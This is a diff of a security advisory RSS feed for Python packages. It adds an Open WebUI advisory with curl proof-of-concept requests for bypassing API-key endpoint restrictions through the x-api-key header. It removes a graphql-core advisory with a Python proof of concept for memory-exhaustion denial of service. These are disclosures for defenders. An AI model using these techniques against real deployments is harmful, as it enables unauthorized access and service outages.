@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://prajeetguha.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-11-03T21:31:52.282Z</updated>
+    <updated>2026-11-04T01:55:40.042Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,68 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[open-webui] Open WebUI's API key endpoint restrictions bypassed via `x-api-key` header — full message processing on restricted endpoints]]></title>
+        <id>https://github.com/advisories/GHSA-57q6-fvp4-pqmm</id>
+        <link href="https://github.com/advisories/GHSA-57q6-fvp4-pqmm"/>
+        <updated>2026-11-03T21:48:50.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Open WebUI allows admins to restrict which API endpoints an API key can access. When an API key is restricted from <code>/api/v1/messages</code>, requests using the <code>Authorization: Bearer sk-...</code> header are correctly blocked with 403. However, the same key sent via the <code>x-api-key</code> header bypasses the restriction entirely — the request is authenticated, the model is invoked, and a full response is returned.</p>
+<h3 id="details">Details</h3>
+<p>Open WebUI's Anthropic-compatible API path accepts authentication via <code>x-api-key</code> header (standard for the Anthropic API). The endpoint restriction check only applies to keys presented via the <code>Authorization</code> header. When the same <code>sk-...</code> key is supplied in <code>x-api-key</code>, the restriction check is skipped but the key is still valid for authentication.</p>
+<p>This means any API key, regardless of its configured endpoint restrictions, can access any API endpoint by simply using <code>x-api-key</code> instead of <code>Authorization</code>.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Verified against Open WebUI v0.8.11.</strong></p>
+<p><strong>Setup:</strong> Admin creates a user with an API key that has endpoint restrictions (not allowed on <code>/api/v1/messages</code>). A mock OpenAI-compatible model (<code>mock-model</code>) is configured.</p>
+<pre><code class="language-bash">API_KEY="sk-dc56016d720e49ba9e95584d602b79bb"
+
+# Test 1: Authorization header — BLOCKED (endpoint restriction enforced)
+curl -s -X POST http://target:8080/api/v1/messages \
+  -H "Authorization: Bearer $API_KEY" \
+  -H 'Content-Type: application/json' \
+  -d '{"model":"mock-model","messages":[{"role":"user","content":"via Authorization header"}]}'
+
+# Test 2: x-api-key header — BYPASS (same key, restriction skipped)
+curl -s -X POST http://target:8080/api/v1/messages \
+  -H "x-api-key: $API_KEY" \
+  -H 'Content-Type: application/json' \
+  -d '{"model":"mock-model","messages":[{"role":"user","content":"via x-api-key header"}]}'
+</code></pre>
+<p><strong>Verified output:</strong></p>
+<pre><code># Authorization header:
+{"detail":"API key not allowed to access this endpoint."}
+
+# x-api-key header (SAME key):
+{"id":"chatcmpl-mock","type":"message","role":"assistant","content":[{"type":"text","text":"MOCK-CHAT-RESPONSE"}],"model":"mock-model","usage":{"input_tokens":1,"output_tokens":1}}
+</code></pre>
+<p>The same API key is rejected via <code>Authorization</code> (403) but fully processed via <code>x-api-key</code> (200 with model response).</p>
+<h3 id="impact">Impact</h3>
+<p>Any API key with endpoint restrictions can bypass those restrictions by using the <code>x-api-key</code> header instead of <code>Authorization</code>. This undermines the entire API key permission model:</p>
+<ul>
+<li>Keys restricted from chat/completion endpoints can still send messages and receive LLM responses</li>
+<li>Keys restricted from admin endpoints may access admin functionality</li>
+<li>The operator's intended access control is silently ineffective</li>
+<li>API credit spend cannot be controlled through endpoint restrictions</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-57q6-fvp4-pqmm">https://github.com/open-webui/open-webui/security/advisories/GHSA-57q6-fvp4-pqmm</a></li>
+<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.9.0">https://github.com/open-webui/open-webui/releases/tag/v0.9.0</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45339">https://nvd.nist.gov/vuln/detail/CVE-2026-45339</a></li>
+<li><a href="https://github.com/advisories/GHSA-57q6-fvp4-pqmm">https://github.com/advisories/GHSA-57q6-fvp4-pqmm</a></li>
+<li><a href="https://github.com/open-webui/open-webui">https://github.com/open-webui/open-webui</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-3543.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-3543.yaml</a></li>
+<li><a href="https://pypi.org/project/open-webui">https://pypi.org/project/open-webui</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-57q6-fvp4-pqmm</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-14T20:21:26.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[feast] Feast vulnerable to unsafe deserialization RCE in registry server via UDF proto]]></title>
         <id>https://github.com/advisories/GHSA-q63x-9pfm-mjx4</id>
@@ -1063,71 +1125,5 @@ for count in (3200, 6400):
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-10-30T23:03:37.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[graphql-core] GraphQL-core has denial of service via memory leak in aborted validations]]></title>
-        <id>https://github.com/advisories/GHSA-mpqx-q82w-9x46</id>
-        <link href="https://github.com/advisories/GHSA-mpqx-q82w-9x46"/>
-        <updated>2026-10-30T22:58:33.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>When a validation was aborted because the document contained more errors than allowed by <code>max_errors</code> (100 by default), <code>validate()</code> raised a single module-level <code>ValidationAbortedError</code> instance. Python appends the frames of every <code>raise</code> to the existing <code>__traceback__</code> of an exception that is raised again, so every aborted validation extended the traceback of this shared error. That traceback kept the frames, and with them the document, the validation context and all errors of every aborted validation, alive for the lifetime of the process.</p>
-<h3 id="details">Details</h3>
-<p>Any client can trigger an aborted validation by sending a small document with more than 100 validation errors, e.g. 101 unknown fields. No authentication is required, and since validation runs before execution, depth limiters and complexity analyzers do not prevent it. Each such request permanently retained about 124 KiB on CPython 3.12, without an upper limit, so memory grew with every request until the process was restarted or killed.</p>
-<p>GraphQL.js uses a shared error object at the same place, but JavaScript errors capture their stack trace only once when they are created, so it is not affected. GraphQL-core 3.2 creates a new error for each aborted validation and is not affected either.</p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<pre><code class="language-python">import gc
-import tracemalloc
-from graphql import build_schema, parse, validate
-
-schema = build_schema("type Query { a: Int }")
-document = parse("{ " + " ".join(f"f{i}" for i in range(101)) + " }")
-
-tracemalloc.start()
-validate(schema, document)
-gc.collect()
-base = tracemalloc.get_traced_memory()[0]
-for _ in range(200):
-    validate(schema, document)
-gc.collect()
-print((tracemalloc.get_traced_memory()[0] - base) // 1024, "KiB")
-</code></pre>
-<p>With GraphQL-core 3.3.0 on CPython 3.12, the retained memory grows from 147 KiB after one call to about 25 MB after 200 calls. With the fix, it stays constant at about 180 KiB.</p>
-<h3 id="impact">Impact</h3>
-<p>Denial of service through memory exhaustion. A few thousand small requests are enough to push a worker past a typical 256 MB or 512 MB container limit and trigger an OOM kill. No data is disclosed or modified.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in <strong>3.3.1</strong>.</p>
-<p><code>validate()</code> now creates a new <code>ValidationAbortedError</code> for every aborted validation and removes its traceback and exception context before returning it, so that the returned errors do not keep the frames of the validation alive. The module-level <code>validation_aborted_error</code> instance, which was not exported, has been removed.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade, clear the traceback of the shared error after each validation:</p>
-<pre><code class="language-python">from graphql.validation import validate as validate_document
-from graphql.validation.validate import validation_aborted_error
-
-def validate(*args, **kwargs):
-    try:
-        return validate_document(*args, **kwargs)
-    finally:
-        validation_aborted_error.__traceback__ = None
-</code></pre>
-<p>Pass this function instead of the original <code>validate</code> where your framework allows it.</p>
-<h3 id="credits">Credits</h3>
-<p>Reported by @riodw. @Fire162 submitted a first fix in #288.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/graphql-python/graphql-core/security/advisories/GHSA-mpqx-q82w-9x46">https://github.com/graphql-python/graphql-core/security/advisories/GHSA-mpqx-q82w-9x46</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-119286">https://nvd.nist.gov/vuln/detail/CVE-2026-119286</a></li>
-<li><a href="https://github.com/graphql-python/graphql-core/issues/287">https://github.com/graphql-python/graphql-core/issues/287</a></li>
-<li><a href="https://github.com/graphql-python/graphql-core/pull/288">https://github.com/graphql-python/graphql-core/pull/288</a></li>
-<li><a href="https://github.com/graphql-python/graphql-core/commit/3c319fd9f4b8f6c9db4189520561bf8dd0e70be9">https://github.com/graphql-python/graphql-core/commit/3c319fd9f4b8f6c9db4189520561bf8dd0e70be9</a></li>
-<li><a href="https://github.com/graphql-python/graphql-core/releases/tag/v3.3.1">https://github.com/graphql-python/graphql-core/releases/tag/v3.3.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-mpqx-q82w-9x46">https://github.com/advisories/GHSA-mpqx-q82w-9x46</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mpqx-q82w-9x46</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-30T22:58:31.000Z</published>
     </entry>
 </feed>
